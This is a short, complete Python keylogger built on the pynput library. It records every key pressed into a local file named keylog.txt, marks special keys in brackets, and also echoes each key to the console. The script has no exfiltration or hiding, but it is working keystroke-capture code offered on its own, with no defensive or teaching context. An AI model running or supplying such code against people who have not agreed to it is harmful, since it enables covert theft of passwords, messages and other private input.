from pynput.keyboard import Key, Listener

log = open("keylog.txt", "a", encoding="utf-8")

def on_press(key):
    if key == Key.space:
        log.write(" ")
    else:
        try:
            log.write(key.char)
        except AttributeError:
            log.write(f"[{key}]")
    log.flush()
    print(key)

with Listener (on_press=on_press) as listener:
   listener.join()
   
